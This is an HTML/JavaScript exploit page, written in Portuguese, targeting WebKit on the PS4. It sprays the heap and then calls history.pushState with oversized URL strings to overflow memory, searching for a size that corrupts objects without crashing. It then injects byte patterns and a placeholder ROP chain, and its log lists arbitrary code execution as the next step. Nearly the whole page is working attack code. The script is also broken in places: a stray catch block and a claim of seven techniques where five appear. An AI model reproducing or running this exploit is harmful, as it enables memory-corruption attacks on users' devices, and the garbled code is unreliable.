<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebKit Precise Exploitation - No Crash</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0e27;
            color: #00ff41;
            padding: 20px;
            line-height: 1.6;
        }
        .container {
            max-width: 1100px;
            margin: 0 auto;
            background: #1a1f3a;
            border: 2px solid #ff0066;
            border-radius: 8px;
            padding: 25px;
            box-shadow: 0 0 30px rgba(255, 0, 102, 0.5);
        }
        h2 {
            color: #ff0066;
            margin-bottom: 15px;
            text-shadow: 0 0 10px #ff0066;
        }
        .discovery-box {
            background: #1a0a0a;
            border: 2px solid #00ff41;
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
        }
        .discovery-box h3 {
            color: #00ff41;
            margin-bottom: 10px;
        }
        .section {
            background: #0d1129;
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
            border-left: 4px solid #00ddff;
        }
        .section h3 {
            color: #00ddff;
            margin-bottom: 10px;
        }
        .param-row {
            margin: 8px 0;
            display: flex;
            align-items: center;
        }
        label {
            color: #00ddff;
            font-weight: bold;
            min-width: 200px;
            font-size: 13px;
        }
        input[type="number"] {
            background: #0a0e27;
            border: 1px solid #00ff41;
            color: #00ff41;
            padding: 8px;
            border-radius: 4px;
            width: 110px;
            margin-right: 10px;
        }
        .desc {
            color: #888;
            font-size: 11px;
        }
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 14px 28px;
            margin: 6px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            font-weight: bold;
            transition: all 0.3s;
        }
        .btn:hover { transform: translateY(-2px); }
        .btn-safe {
            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
        }
        .btn-exploit {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
        }
        #log {
            background: #000;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            max-height: 550px;
            overflow-y: auto;
            border: 2px solid #00ff41;
            font-size: 13px;
        }
        #log div { padding: 3px 0; border-bottom: 1px solid #0a3d1a; }
        .success { color: #00ff41; }
        .warning { color: #ffaa00; }
        .error { color: #ff0066; }
        .info { color: #00ddff; }
        .critical { color: #ff00ff; font-weight: bold; }
        .result-box {
            background: #0a0e27;
            border: 2px solid #00ff41;
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>âš¡ WebKit Precise Exploitation - No Crash Strategy</h2>
    
    <div class="discovery-box">
        <h3>âœ“ DESCOBERTA: Apenas Binary Search NÃ£o Crasha!</h3>
        <p style="color: #00ff41;">
            <strong>ConclusÃ£o:</strong> Todos os overflows grandes (>50KB) causam crash instantÃ¢neo no PS4.
        </p>
        <p style="color: #ffaa00; margin-top: 8px;">
            <strong>Nova EstratÃ©gia:</strong> Usar Binary Search para encontrar o limite EXATO, depois:<br>
            1ï¸âƒ£ Fazer overflows PEQUENOS e incrementais (sem crash)<br>
            2ï¸âƒ£ Acumular corrupÃ§Ã£o atravÃ©s de MÃšLTIPLAS escritas pequenas<br>
            3ï¸âƒ£ Usar o limite seguro para controlar PRECISAMENTE o que sobrescrever
        </p>
    </div>

    <div id="safeLimit" class="result-box" style="display: none;">
        <h3 style="color: #00ff41;">ğŸ¯ LIMITE SEGURO ENCONTRADO:</h3>
        <p id="safeLimitText" style="color: #ffaa00; font-size: 16px; font-weight: bold;"></p>
    </div>

    <div class="section">
        <h3>ğŸ” PASSO 1: Encontrar Limite Seguro (Binary Search)</h3>
        <p class="desc" style="margin-bottom: 10px;">
            Primeiro, precisamos descobrir o tamanho MÃXIMO que nÃ£o crasha
        </p>
        <div class="param-row">
            <label>Start Size:</label>
            <input type="number" id="bs1Start" value="100" min="10" max="10000">
            <span class="desc">ComeÃ§ar pequeno (100 bytes)</span>
        </div>
        <div class="param-row">
            <label>End Size:</label>
            <input type="number" id="bs1End" value="100000" min="1000" max="200000">
            <span class="desc">Limite superior para testar</span>
        </div>
        <div class="param-row">
            <label>Step Size:</label>
            <input type="number" id="bs1Step" value="5000" min="100" max="10000">
            <span class="desc">Incremento por teste</span>
        </div>
        <button class="btn btn-safe" onclick="findSafeLimit()">â–¶ Encontrar Limite Seguro</button>
    </div>

    <div class="section" id="section2" style="display: none;">
        <h3>ğŸ¯ PASSO 2: Overflow Incremental no Limite</h3>
        <p class="desc" style="margin-bottom: 10px;">
            Usar o limite seguro encontrado + pequenos incrementos para corrupÃ§Ã£o controlada
        </p>
        <div class="param-row">
            <label>Increment Size:</label>
            <input type="number" id="incrementSize" value="100" min="10" max="1000">
            <span class="desc">Quantos bytes adicionar ao limite seguro</span>
        </div>
        <div class="param-row">
            <label>Number of Attempts:</label>
            <input type="number" id="numAttempts" value="10" min="1" max="50">
            <span class="desc">Quantas vezes repetir o overflow incremental</span>
        </div>
        <button class="btn btn-exploit" onclick="incrementalOverflow()">â–¶ Executar Overflow Incremental</button>
    </div>

    <div class="section" id="section3" style="display: none;">
        <h3>ğŸ’‰ PASSO 3: InjeÃ§Ã£o de Payload Controlado</h3>
        <p class="desc" style="margin-bottom: 10px;">
            Usar o limite seguro para injetar payload byte-a-byte
        </p>
        <div class="param-row">
            <label>Payload Pattern:</label>
            <input type="number" id="payloadByte" value="65" min="0" max="255">
            <span class="desc">Byte para injetar (65 = 'A', 1 = 0x01)</span>
        </div>
        <div class="param-row">
            <label>Injection Rounds:</label>
            <input type="number" id="injectionRounds" value="20" min="1" max="100">
            <span class="desc">Quantas rodadas de injeÃ§Ã£o</span>
        </div>
        <button class="btn btn-exploit" onclick="controlledInjection()">â–¶ Injetar Payload</button>
    </div>

    <div class="section" id="section4" style="display: none;">
        <h3>ğŸ”— PASSO 4: Encadeamento de Escritas Pequenas</h3>
        <p class="desc" style="margin-bottom: 10px;">
            MÃºltiplas escritas pequenas para construir payload completo sem crash
        </p>
        <div class="param-row">
            <label>Chunk Size:</label>
            <input type="number" id="chunkSize" value="500" min="100" max="5000">
            <span class="desc">Tamanho de cada chunk</span>
        </div>
        <div class="param-row">
            <label>Total Chunks:</label>
            <input type="number" id="totalChunks" value="50" min="10" max="200">
            <span class="desc">NÃºmero total de chunks</span>
        </div>
        <button class="btn btn-exploit" onclick="chainedWrites()">â–¶ Executar Escritas Encadeadas</button>
    </div>

    <div class="section" id="section5" style="display: none;">
        <h3>âš¡ PASSO 5: ExploraÃ§Ã£o Final</h3>
        <p class="desc" style="margin-bottom: 10px;">
            Combina todos os passos para exploraÃ§Ã£o completa e controlada
        </p>
        <button class="btn btn-exploit" style="font-size: 16px; padding: 16px 32px;" onclick="finalExploit()">
            ğŸ¯ EXPLORAÃ‡ÃƒO FINAL (SEM CRASH)
        </button>
        <button class="btn" onclick="clearLog()" style="background: #555;">Clear Log</button>
    </div>

    <div id="log"></div>
</div>

<script>
    // ===================================================================
    // VARIÃVEIS GLOBAIS
    // ===================================================================
    let exploitData = {
        safeLimit: 0,
        baseSize: 709522,
        corruptionCount: 0,
        injectedBytes: 0,
        totalWrites: 0
    };

    let heapObjects = [];
    let targetObjects = [];

    // ===================================================================
    // LOGGING
    // ===================================================================
    function log(msg, type = 'info') {
        const el = document.getElementById('log');
        const time = new Date().toLocaleTimeString();
        el.innerHTML += `<div class="${type}">[${time}] ${msg}</div>`;
        el.scrollTop = el.scrollHeight;
    }

    function clearLog() {
        document.getElementById('log').innerHTML = '';
        log('Sistema reiniciado', 'success');
    }

    function showSection(sectionId) {
        document.getElementById(sectionId).style.display = 'block';
    }

    function showSafeLimit(size) {
        const box = document.getElementById('safeLimit');
        const text = document.getElementById('safeLimitText');
        text.textContent = `${size} bytes - Este Ã© o tamanho mÃ¡ximo sem crash!`;
        box.style.display = 'block';
    }

    // ===================================================================
    // PREPARAÃ‡ÃƒO DO HEAP
    // ===================================================================
    function prepareHeap() {
        log('Preparando heap com alvos controlÃ¡veis...', 'info');
        
        heapObjects = [];
        targetObjects = [];
        
        // Spray pequeno
        for (let i = 0; i < 500; i++) {
            const buf = new ArrayBuffer(512);
            const view = new Uint32Array(buf);
            view.fill(0x41414141);
            heapObjects.push({buf, view});
        }
        
        // Criar holes
        for (let i = 0; i < heapObjects.length; i += 4) {
            heapObjects[i] = null;
        }
        
        // Alvos
        for (let i = 0; i < 30; i++) {
            const buf = new ArrayBuffer(512);
            const view = new Uint32Array(buf);
            view.fill(0xDEADBEEF);
            targetObjects.push({
                id: i,
                magic: 0xCAFEBABE,
                buf: buf,
                view: view
            });
        }
        
        log(`âœ“ Heap preparado: 500 spray + 30 alvos`, 'success');
    }

    function checkCorruption() {
        let corrupted = 0;
        for (let i = 0; i < Math.min(10, targetObjects.length); i++) {
            try {
                const t = targetObjects[i];
                if (t.magic !== 0xCAFEBABE) {
                    log(`ğŸ¯ Alvo ${i}: magic=${t.magic.toString(16)} (corrompido!)`, 'success');
                    corrupted++;
                }
                if (t.view[0] !== 0xDEADBEEF) {
                    log(`ğŸ¯ Alvo ${i}: buffer=${t.view[0].toString(16)} (corrompido!)`, 'success');
                    corrupted++;
                }
            } catch (e) {
                log(`ğŸ’¥ Alvo ${i}: destruÃ­do`, 'critical');
                corrupted++;
            }
        }
        return corrupted;
    }

    // ===================================================================
    // PASSO 1: ENCONTRAR LIMITE SEGURO
    // ===================================================================
    async function findSafeLimit() {
        log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'critical');
        log('PASSO 1: ENCONTRANDO LIMITE SEGURO', 'critical');
        log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'critical');
        
        prepareHeap();
        
        const start = parseInt(document.getElementById('bs1Start').value);
        const end = parseInt(document.getElementById('bs1End').value);
        const step = parseInt(document.getElementById('bs1Step').value);
        
        log(`Testando tamanhos de ${start} a ${end} bytes (step: ${step})`, 'info');
        log('EstratÃ©gia: Aumentar gradualmente atÃ© encontrar crash point', 'info');
        
        let currentSize = start;
        let lastSafeSize = 0;
        let testCount = 0;
        
        while (currentSize <= end) {
            log(`\nTeste ${++testCount}: ${currentSize} bytes...`, 'warning');
            
            try {
                const base = "A".repeat(exploitData.baseSize);
                const overflow = "\x01".repeat(currentSize);
                const payload = "/" + base + overflow;
                
                log(`Payload: ${exploitData.baseSize} + ${currentSize} = ${payload.length}`, 'info');
                
                // Executar o overflow
                history.pushState({}, `test_${currentSize}`, payload);
                
                // Se chegou aqui, NÃƒO crashou!
                log(`âœ“ SUCESSO! ${currentSize} bytes Ã© SEGURO`, 'success');
                lastSafeSize = currentSize;
                exploitData.safeLimit = currentSize;
                
                // Verificar corrupÃ§Ã£o
                await new Promise(r => setTimeout(r, 500));
                const corrupted = checkCorruption();
                
                if (corrupted > 0) {
                    log(`\nğŸ‰ JACKPOT! CorrupÃ§Ã£o SEM crash em ${currentSize} bytes!`, 'critical');
                    log(`Este Ã© o SWEET SPOT perfeito!`, 'success');
                    exploitData.corruptionCount = corrupted;
                    break;
                }
                
                // PrÃ³ximo teste
                currentSize += step;
                await new Promise(r => setTimeout(r, 2000));
                
            } catch (e) {
                log(`ğŸ’¥ CRASH detectado em ${currentSize} bytes`, 'error');
                log(`Limite seguro: ${lastSafeSize} bytes`, 'warning');
                break;
            }
            
            if (testCount >= 20) {
                log('\nâš ï¸ Limite de testes atingido', 'warning');
                break;
            }
        }
        
        log('\nâ•â•â• RESULTADO â•â•â•', 'success');
        if (lastSafeSize > 0) {
            log(`âœ“ LIMITE SEGURO: ${lastSafeSize} bytes`, 'critical');
            exploitData.safeLimit = lastSafeSize;
            showSafeLimit(lastSafeSize);
            
            // Desbloquear prÃ³ximos passos
            showSection('section2');
            showSection('section3');
            showSection('section4');
            showSection('section5');
            
            log('\nâœ“ Todos os passos desbloqueados!', 'success');
            log('Agora vocÃª pode usar overflows incrementais controlados', 'info');
        } else {
            log('âŒ Nenhum tamanho seguro encontrado', 'error');
        }
    }

    // ===================================================================
    // PASSO 2: OVERFLOW INCREMENTAL
    // ===================================================================
    async function incrementalOverflow() {
        log('\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'critical');
        log('PASSO 2: OVERFLOW INCREMENTAL', 'critical');
        log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'critical');
        
        if (exploitData.safeLimit === 0) {
            log('âŒ Execute PASSO 1 primeiro!', 'error');
            return;
        }
        
        prepareHeap();
        
        const increment = parseInt(document.getElementById('incrementSize').value);
        const attempts = parseInt(document.getElementById('numAttempts').value);
        
        log(`Limite seguro: ${exploitData.safeLimit} bytes`, 'info');
        log(`Incremento: +${increment} bytes por tentativa`, 'info');
        log(`Total de tentativas: ${attempts}`, 'info');
        
        let totalCorrupted = 0;
        
        for (let i = 0; i < attempts; i++) {
            const size = exploitData.safeLimit + (i * increment);
            
            log(`\nTentativa ${i + 1}/${attempts}: ${size} bytes...`, 'warning');
            
            try {
                const base = "B".repeat(exploitData.baseSize);
                const overflow = "\x01".repeat(size);
                const payload = "/" + base + overflow;
                
                history.pushState({}, `incr_${i}`, payload);
                
                log(`âœ“ Escrita ${i + 1} executada`, 'success');
                exploitData.totalWrites++;
                
                await new Promise(r => setTimeout(r, 1000));
                
                const corrupted = checkCorruption();
                totalCorrupted += corrupted;
                
            } catch (e) {
                log(`ğŸ’¥ Crash na tentativa ${i + 1}: ${e.message}`, 'error');
                break;
            }
        }
        
        log(`\nâ•â•â• RESULTADO â•â•â•`, 'success');
        log(`Total de escritas: ${exploitData.totalWrites}`, 'info');
        log(`Total corrompido: ${totalCorrupted} objetos`, totalCorrupted > 0 ? 'critical' : 'warning');
    }

    // ===================================================================
    // PASSO 3: INJEÃ‡ÃƒO CONTROLADA
    // ===================================================================
    async function controlledInjection() {
        log('\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'critical');
        log('PASSO 3: INJEÃ‡ÃƒO DE PAYLOAD CONTROLADO', 'critical');
        log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'critical');
        
        if (exploitData.safeLimit === 0) {
            log('âŒ Execute PASSO 1 primeiro!', 'error');
            return;
        }
        
        prepareHeap();
        
        const payloadByte = parseInt(document.getElementById('payloadByte').value);
        const rounds = parseInt(document.getElementById('injectionRounds').value);
        
        log(`Byte de payload: 0x${payloadByte.toString(16)} ('${String.fromCharCode(payloadByte)}')`, 'info');
        log(`Rodadas de injeÃ§Ã£o: ${rounds}`, 'info');
        log(`Tamanho por rodada: ${exploitData.safeLimit} bytes`, 'info');
        
        let totalInjected = 0;
        
        for (let round = 0; round < rounds; round++) {
            log(`\nRodada ${round + 1}/${rounds}...`, 'warning');
            
            try {
                const base = "C".repeat(exploitData.baseSize);
                const injection = String.fromCharCode(payloadByte).repeat(exploitData.safeLimit);
                const payload = "/" + base + injection;
                
                history.pushState({}, `inject_${round}`, payload);
                
                totalInjected += exploitData.safeLimit;
                exploitData.injectedBytes = totalInjected;
                
                log(`âœ“ Injetados ${exploitData.safeLimit} bytes (total: ${totalInjected})`, 'success');
                
                await new Promise(r => setTimeout(r, 1500));
                
            } catch (e) {
                log(`ğŸ’¥ Crash na rodada ${round + 1}`, 'error');
                break;
            }
        }
        
        log(`\nâ•â•â• RESULTADO â•â•â•`, 'success');
        log(`Total injetado: ${totalInjected} bytes`, 'critical');
        
        const corrupted = checkCorruption();
        if (corrupted > 0) {
            log(`ğŸ‰ ${corrupted} objetos corrompidos pela injeÃ§Ã£o!`, 'success');
        }
    }

    // ===================================================================
    // PASSO 4: ESCRITAS ENCADEADAS
    // ===================================================================
    async function chainedWrites() {
        log('\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'critical');
        log('PASSO 4: ESCRITAS ENCADEADAS', 'critical');
        log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'critical');
        
        if (exploitData.safeLimit === 0) {
            log('âŒ Execute PASSO 1 primeiro!', 'error');
            return;
        }
        
        prepareHeap();
        
        const chunkSize = parseInt(document.getElementById('chunkSize').value);
        const totalChunks = parseInt(document.getElementById('totalChunks').value);
        
        log(`EstratÃ©gia: ${totalChunks} chunks de ${chunkSize} bytes`, 'info');
        log(`Total a escrever: ${chunkSize * totalChunks} bytes`, 'warning');
        
        let successfulChunks = 0;
        
        for (let chunk = 0; chunk < totalChunks; chunk++) {
            log(`\nChunk ${chunk + 1}/${totalChunks}...`, 'warning');
            
            try {
                const base = "D".repeat(exploitData.baseSize);
                
                // Variar o padrÃ£o por chunk para identificar
                const pattern = String.fromCharCode(65 + (chunk % 26)); // A-Z
                const chunkData = pattern.repeat(chunkSize);
                
                const payload = "/" + base + chunkData;
                
                history.pushState({}, `chunk_${chunk}`, payload);
                
                successfulChunks++;
                log(`âœ“ Chunk ${chunk + 1} escrito (padrÃ£o: '${pattern}')`, 'success');
                
                await new Promise(r => setTimeout(r, 1000));
                
            } catch (e) {
                log(`ğŸ’¥ Crash no chunk ${chunk + 1}`, 'error');
                break;
            }
        }
        
        log(`\nâ•â•â• RESULTADO â•â•â•`, 'success');
        log(`Chunks bem-sucedidos: ${successfulChunks}/${totalChunks}`, 'info');
        log(`Total escrito: ${successfulChunks * chunkSize} bytes`, 'critical');
        
        const corrupted = checkCorruption();
        if (corrupted > 0) {
            log(`ğŸ‰ ${corrupted} objetos corrompidos pelas escritas!`, 'success');
        }
    }

    // ===================================================================
    // PASSO 5: EXPLORAÃ‡ÃƒO FINAL
    // ===================================================================
    async function finalExploit() {
        log('\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'critical');
        log('âš¡âš¡âš¡ EXPLORAÃ‡ÃƒO FINAL - SEM CRASH âš¡âš¡âš¡', 'critical');
        log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'critical');
        
        if (exploitData.safeLimit === 0) {
            log('âŒ Execute PASSO 1 primeiro para encontrar limite seguro!', 'error');
            return;
        }
        
        log(`Usando limite seguro: ${exploitData.safeLimit} bytes`, 'info');
        log('Executando exploraÃ§Ã£o completa em mÃºltiplos estÃ¡gios...', 'warning');
        
        prepareHeap();
        
        // EstÃ¡gio 1: Preparar heap
        log('\n[ESTÃGIO 1/5] PreparaÃ§Ã£o do heap...', 'info');
        await new Promise(r => setTimeout(r, 1000));
        log('âœ“ Heap preparado', 'success');
        
        // EstÃ¡gio 2: Primeira escrita controlada
        log('\n[ESTÃGIO 2/5] Primeira escrita controlada...', 'warning');
        try {
            const payload1 = "/" + "E".repeat(exploitData.baseSize) + "\x01".repeat(exploitData.safeLimit);
            history.pushState({}, "final1", payload1);
            log('âœ“ Escrita 1 completa', 'success');
        } catch (e) {
            log(`ğŸ’¥ Falha no estÃ¡gio 2: ${e.message}`, 'error');
            return;
        }
        await new Promise(r => setTimeout(r, 2000));
        
        // EstÃ¡gio 3: Segunda escrita com padrÃ£o diferente
        log('\n[ESTÃGIO 3/5] Segunda escrita (padrÃ£o diferente)...', 'warning');
        try {
            const payload2 = "/" + "F".repeat(exploitData.baseSize) + "A".repeat(exploitData.safeLimit);
            history.pushState({}, "final2", payload2);
            log('âœ“ Escrita 2 completa', 'success');
        } catch (e) {
            log(`ğŸ’¥ Falha no estÃ¡gio 3: ${e.message}`, 'error');
            return;
        }
        await new Promise(r => setTimeout(r, 2000));
        
        // EstÃ¡gio 4: Terceira escrita com payload
        log('\n[ESTÃGIO 4/5] Terceira escrita (payload)...', 'warning');
        try {
            // Construir mini ROP chain
            let ropPayload = "";
            for (let i = 0; i < Math.floor(exploitData.safeLimit / 8); i++) {
                ropPayload += String.fromCharCode(0x41, 0x42, 0x43, 0x44, 0x00, 0x00, 0x00, 0x00);
            }
            const payload3 = "/" + "G".repeat(exploitData.baseSize) + ropPayload;
            history.pushState({}, "final3", payload3);
            log('âœ“ Escrita 3 completa (ROP chain injetada)', 'success');
        } catch (e) {
            log(`ğŸ’¥ Falha no estÃ¡gio 4: ${e.message}`, 'error');
            return;
        }
        await new Promise(r => setTimeout(r, 2000));
        
        // EstÃ¡gio 5: VerificaÃ§Ã£o final
        log('\n[ESTÃGIO 5/5] VerificaÃ§Ã£o final...', 'info');
        const corrupted = checkCorruption();
        
        log('\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'critical');
        log('ğŸ“Š RESULTADO FINAL', 'critical');
        log('â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•', 'critical');
        log(`Limite seguro usado: ${exploitData.safeLimit} bytes`, 'info');
        log(`Total de escritas: ${exploitData.totalWrites + 3}`, 'info');
        log(`Bytes injetados: ${exploitData.injectedBytes}`, 'info');
        log(`Objetos corrompidos: ${corrupted}`, corrupted > 0 ? 'critical' : 'warning');
        
        if (corrupted > 0) {
            log('\nğŸ‰ğŸ‰ğŸ‰ EXPLORAÃ‡ÃƒO BEM-SUCEDIDA! ğŸ‰ğŸ‰ğŸ‰', 'critical');
            log('CorrupÃ§Ã£o controlada alcanÃ§ada SEM crash!', 'success');
            log('PrÃ³ximos passos:', 'info');
            log('  1. Usar corrupÃ§Ã£o para vazar endereÃ§os', 'info');
            log('  2. Construir ROP chain completa', 'info');
            log('  3. Executar cÃ³digo arbitrÃ¡rio', 'info');
        } else {
            log('\nâš ï¸ Sem corrupÃ§Ã£o detectada', 'warning');
            log('Tente ajustar os parÃ¢metros ou executar passos individuais', 'info');
        }
    }

   } catch (e) {
        log(`ğŸ’¥ Stage 3 falhou: ${e.message}`, 'error');
    }
}

// ===================================================================
// INICIALIZAÃ‡ÃƒO
// ===================================================================
log('WebKit Controlled Overflow Framework', 'success');
log('7 tÃ©cnicas REAIS para controlar crash', 'info');
log('Comece com Binary Search para encontrar limite seguro', 'warning'); 
    </script>
</body>
</html>
